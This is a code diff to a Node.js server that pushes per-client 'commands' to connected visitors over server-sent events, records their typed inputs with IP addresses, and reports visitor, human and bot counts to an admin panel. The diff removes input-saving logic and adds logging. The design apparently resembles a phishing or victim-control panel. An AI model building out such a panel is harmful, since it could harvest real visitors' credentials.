@@ -167,13 +167,7 @@ function removeClientFromDatabase(clientId) {
     });
 }
 
-function updateClientInputs(clientId, inputs) {
-    db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
-        if (err) {
-            console.error(`Error updating inputs for client ${clientId}: ${err.message}`);
-        }
-    });
-}
+
 
 	function getClientData(callback) {
 	    db.all("SELECT * FROM clients", (err, rows) => {
@@ -295,6 +289,7 @@ app.post('/send-command', (req, res) => {
     const client = clients[clientId];
     if (client) {
         client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
+        console.log("command: "+command+" set for " + client);
     }
     res.sendStatus(200);
 });
@@ -374,21 +369,6 @@ app.post('/input', async (req, res) => {
             if (err) {
                 console.error("Error updating client command:", err);
                 return res.status(500).send('Error updating client command');
-            } else if (!rowUpdated) {
-                console.log("No row updated, client does not exist in the database.");
-                // Client doesn't exist, add them
-                addInputClientToDatabase(clientId, ipAddress, command, async (addErr) => {
-                    if (addErr) {
-                        console.error("Error adding client to database:", addErr);
-                        return res.status(500).send('Error adding client to database');
-                    } else {
-                        console.log("Client added to database successfully.");
-                        // Update inputs after adding client
-                        await updateClientInputs(clientId, inputs);
-                        broadcastAdminPanel(currPage, { visitors, humans, bots });
-                        return res.sendStatus(200);
-                    }
-                });
             } else {
                 console.log("Client command updated successfully.");
                 // Client command updated successfully
